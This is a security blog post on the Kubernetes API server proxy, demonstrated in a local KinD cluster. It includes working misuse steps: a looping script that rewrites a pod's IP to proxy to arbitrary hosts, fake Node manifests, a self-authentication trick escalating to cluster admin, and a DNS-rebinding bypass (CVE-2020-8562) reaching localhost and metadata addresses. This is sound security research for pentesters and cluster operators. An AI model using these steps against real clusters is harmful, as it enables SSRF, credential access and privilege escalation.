---
layout: post
title: "Exploring the Kubernetes API Server Proxy" 
date: 2025-01-18 11:00:00 +0100
comments: false
categories: Kubernetes
---

For my first post of the year I thought it'd be interesting to look at a lesser known feature of the Kubernetes API server which has some interesting security implications.

The Kubernetes API server can act as an HTTP proxy server, allowing users with the right access to get to applications they might otherwise not be able to reach. This is one of a number of proxies in the Kubernetes world (detailed [here](https://kubernetes.io/docs/concepts/cluster-administration/proxies/)) which serve different purposes. The proxy can be used to access pods, services, and nodes in the cluster, we'll focus on pods and nodes for this post.

## How does it work?

Let's demonstrate how this works with a [KinD](https://kind.sigs.k8s.io/) cluster and some pods. With a standard kind cluster spun up using `kind create cluster` we can start an echo server so it'll show us what we're sending

```bash
kubectl run echoserver --image gcr.io/google_containers/echoserver:1.10
```

Next (just to make things a bit more complex) we'll start the [kubectl proxy](https://kubernetes.io/docs/tasks/access-application-cluster/access-cluster/#directly-accessing-the-rest-api) on our client to let us send curl requests to the API server more easily

```bash
kubectl proxy
```

With that all in place we can use a `curl` request from our client to access the echoserver pod via the API server proxy

```bash
curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/echoserver:8080/proxy/
```

And you should get a response that looks a bit like this

```
Request Information:
        client_address=10.244.0.1
        method=GET
        real path=/
        query=
        request_version=1.1
        request_scheme=http
        request_uri=http://127.0.0.1:8080/

Request Headers:
        accept=*/*
        accept-encoding=gzip
        host=127.0.0.1:45745
        user-agent=curl/8.5.0
        x-forwarded-for=127.0.0.1, 172.18.0.1
        x-forwarded-uri=/api/v1/namespaces/default/pods/echoserver:8080/proxy/
```

Looking at the response from the echo server we can see some interesting items. The `client_address` is the API servers address on the pod network, and we can also see the `x-forwarded-for` and `x-forwarded-uri` headers are set too.

Graphically the set of connections look a bit like this

![API Server Proxy]({{site.url }}/assets/media/kube-api-proxy.png)

In terms of how this feature works, one interesting point to note here is that it's possible to specify the port that we're using, so the API server proxy can be used to get to any port.

We can also put in anything that works in a curl request and it will be relayed onwards to the proxy targets, so POST requests, headers with tokens or anything else that's valid in curl, which makes this pretty powerful.

It's not just pods that we can proxy to, we can also get to any service running on a node (with an exception we'll mention in a bit). So for example with our kind cluster setup, we can issue a curl command like

```bash
curl http://127.0.0.1:8001/api/v1/nodes/http:kind-control-plane:10256/proxy/healthz
```

and we get back the kube-proxy's healthz endpoint information

```json
{"lastUpdated": "2025-01-18 07:58:53.413049689 +0000 UTC m=+930.365308647","currentTime": "2025-01-18 07:58:53.413049689 +0000 UTC m=+930.365308647", "nodeEligible": true}
```

## Security Controls

Obviously this is a fairly powerful feature and not something you'd want to give to just anyone, so what rights do you need and what restrictions are there on its use?

The user making use of the proxy requires rights to the `proxy` sub-resource of `pods` or `nodes` (N.B. Providing `node/proxy` rights also allows use of the Kubelet APIs more dangerous features).

Additionally there is a check in the API server source code which looks to stop users of this feature from reaching localhost or link-local (e.g. `169.254.169.254`) addresses. The function [`isProxyableHost`](https://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/node/strategy.go#L272) uses the golang function `isGlobalUnicast` to check if it's ok to proxy the requests.

## Bypasses and limitations

Now we've described a bit about how this feature is used and secured, let's get on to the fun part, how can it be (mis)used :)

Obviously a server service that lets us proxy requests, is effectively SSRF by design, so it seems likely that there's are some interesting ways we can use it.

### Proxying to addresses outside the cluster

One thing that might be handy if you're a pentester or perhaps CTF player is being able to use the API server's network position to get access to other hosts on restricted networks. To do that we'd need to be able to tell the API server proxy to direct traffic to arbitrary IP addresses rather than just pods and nodes inside the cluster.

For this we'll go to a Kinvolk [blog post from 2019](https://kinvolk.io/blog/2019/02/abusing-kubernetes-apiserver-proxying), as this technique works fine in 2025!

Essentially, if you own a pod resource you can overwrite the IP address that it has in its status and then proxy to that IP address. It's a little tricky as the Kubernetes cluster will spot this change as a mistake and will change it back to the valid IP address, so you have to loop the requests to keep it set to the value you want.

```bash
#!/bin/bash

set -euo pipefail

readonly PORT=8001
readonly POD=echoserver
readonly TARGETIP=1.1.1.1

while true; do
  curl -v -H 'Content-Type: application/json' \
    "http://localhost:${PORT}/api/v1/namespaces/default/pods/${POD}/status" >"${POD}-orig.json"

  cat $POD-orig.json |
    sed 's/"podIP": ".*",/"podIP": "'${TARGETIP}'",/g' \
      >"${POD}-patched.json"

  curl -v -H 'Content-Type:application/merge-patch+json' \
    -X PATCH -d "@${POD}-patched.json" \
    "http://localhost:${PORT}/api/v1/namespaces/default/pods/${POD}/status"

  rm -f "${POD}-orig.json" "${POD}-patched.json"
done
```

With this script looping, you can make a request like 

```bash
curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/echoserver/proxy/
```

and you'll get the response from the Target IP (in this case 1.1.1.1)

### Fake Node objects

Another route to achieving this goal can be to create fake node objects in the cluster (assuming you've got the rights to do that). How well this one works depends a bit on the distribution as some will quickly clean up any fake nodes that are created, but it works fine in vanilla Kubernetes.

What's handy here is that we can use hostnames instead of just IP addresses so something like

```yaml
kind: Node
apiVersion: v1
metadata:
  name: fakegoogle
status:
  addresses:
  - address: www.google.com
    type: Hostname
```

Will then allow us to issue a curl request like

```bash
curl http://127.0.0.1:8001/api/v1/nodes/http:fakegoogle:80/proxy/
```

and get a response from `www.google.com`.

### Getting the API Server to authenticate to itself

An interesting variation on this idea was noted in the Kubernetes 1.24 Security audit and is currently still an [open issue](https://github.com/kubernetes/kubernetes/issues/119270) so exploitable. This builds on the idea of a fake node by adding additional information to say that the kubelet port on this node is the same as the API server's port. This causes the API server to authenticate to itself and allows someone with create node and node proxy rights to escalate to full cluster admin. 

A YAML like this

```yaml
kind: Node
apiVersion: v1
metadata:
  name: kindserver
status:
  addresses:
  - address: 172.20.0.3
    type: ExternalIP
  daemonEndpoints:
    kubeletEndpoint:
      Port: 6443
```

can be applied and then curl commands like the one below get access to the API server

```bash
curl http://127.0.0.1:8001/api/v1/nodes/https:kindserver:6443/proxy/
```


### CVE-2020-8562 - Bypassing the blocklist

Another point to note about the API server proxy is that it might be possible to bypass the blocklist that's in place via a known, but unpatchable, CVE (There's a great blog with details on the original CVE from the reporter [here](https://business.blogthinkbig.com/kubernetes-vulnerability-discovered-allows-access-restricted-networks-cve-2020-8562/)).

There is a TOCTOU vulnerability in the API servers blocklist checking that means, if you can make requests to an address you control via the API server proxy, you might be able to get the request to go to IP addresses like localhost or the cloud metadata service addresses like `169.254.169.254`.

![CVE-2020-8562]({{site.url }}/assets/media/CVE-2020-8562.png)

Exploiting this one takes a couple of steps. Firstly we can use a fake node object, as described in the previous section, then we'll need a DNS service that resolves to different IP addresses alternately. 

Fortunately for us, there's an existing service we can use for the rebinding, https://lock.cmpxchg8b.com/rebinder.html.

```yaml
kind: Node
apiVersion: v1
metadata:
  name: rebinder
status:
  addresses:
  - address: 2d21209c.7f000001.rbndr.us 
    type: Hostname
```

With that created we can use the URL below to try and access the configuration of the kube-proxy component which is only listening on localhost.

```bash
curl http://127.0.0.1:8001/api/v1/nodes/http:rebinder:10249/proxy/configz
```

As this is a TOCTOU it can take quite a few attempts to get a response. You should see 3 possibilities. firstly a `400` response which happens when the blocklist check fails. Secondly a `503` response where it goes to the external address (in this case the IP address for `scanme.nmap.org`) and doesn't get a response on that URL, and lastly when the TOCTOU is successful you'll get the response back from the proxy service. I generally have found that < 30 requests is needed for a "hit" using this technique.

One place where this particular technique is interesting is obviously cloud hosted Kubernetes clusters, and in particular managed providers where they probably don't want cluster operators requesting localhost interfaces on machines they control :)

To mitigate this many of the ones I've looked at use [Konnectivity](https://kubernetes.io/docs/tasks/extend-kubernetes/setup-konnectivity/) which is *yet another* proxy and can be configured to ensure that any requests that come in from user controlled addresses are routed back to the node network and away from the control plane network.

## Conclusion

The Kubernetes API server proxy is a handy feature for a number of reasons but obviously making any service a proxy is a tricky proposition from a security standpoint.

If you're a cluster operator it's important to be very careful with who you provide proxy rights to, and if you're considering creating a managed Kubernetes service where you don't want cluster owners to have access to the control plane, you're going to need to be very careful with network firewalling and ensuring that the proxy doesn't let them get to areas that should be restricted!